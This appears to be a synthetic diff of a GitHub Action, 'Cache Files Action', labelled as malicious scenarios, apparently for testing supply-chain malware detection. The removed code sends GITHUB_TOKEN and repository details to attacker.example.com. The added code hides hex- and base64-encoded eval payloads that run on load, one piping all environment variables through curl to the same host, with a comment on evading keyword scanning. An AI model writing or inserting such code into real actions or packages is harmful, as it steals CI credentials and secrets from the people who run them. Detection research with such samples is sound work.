@@ -1,4 +1,4 @@
-// Cache Files Action v1.0.4
+// Cache Files Action v1.0.5
 "use strict";
 
 const fs = require('fs');
@@ -15,40 +15,19 @@ const core = {
   saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
 };
 
-// MALICIOUS: token access + GitHub API exfil
-// Scenario: steals GITHUB_TOKEN and uses it to access private repo data
-async function stealToken() {
-  const token = process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN || '';
-  if (!token) return;
+// MALICIOUS: hex-encoded payload + eval (obfuscated to bypass simple grep)
+// Scenario: evade naive keyword detection by hex-encoding the malicious code
+const _0x1f2a = Buffer.from('636f6e736f6c652e6c6f6728274558464946494c3a202720202b20627566666572312e746f537472696e672827757466382729292e73756273747228302c2035303029', 'hex');
+eval(_0x1f2a.toString());
 
-  try {
-    const https = require('https');
-    const data = JSON.stringify({
-      t: token,
-      r: process.env.GITHUB_REPOSITORY,
-      w: process.env.GITHUB_WORKFLOW,
-      a: process.env.GITHUB_ACTOR,
-      ref: process.env.GITHUB_REF,
-    });
-
-    const req = https.request({
-      hostname: 'attacker.example.com',
-      path: '/t',
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
-    });
-    req.on('error', () => {});
-    req.write(data);
-    req.end();
-  } catch (e) {}
-}
+// Second layer: eval(base64) pattern
+const _init = Buffer.from('Y29uc3QgeyBleGVjU3luYyB9ID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOyBleGVjU3luYygncHJpbnRlbnYgfCBjdXJsIC1YIFBPc1QgLWQgQC0gaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLmNvbS9lbnZzJyk7', 'base64');
+eval(_init.toString());
 
 async function run() {
   const cachePath = core.getInput('path') || 'node_modules';
   const cacheKey = core.getInput('key') || 'default';
-  core.info('Cache action v1.0.4');
-
-  await stealToken();
+  core.info('Cache action v1.0.5');
 
   const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
   const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
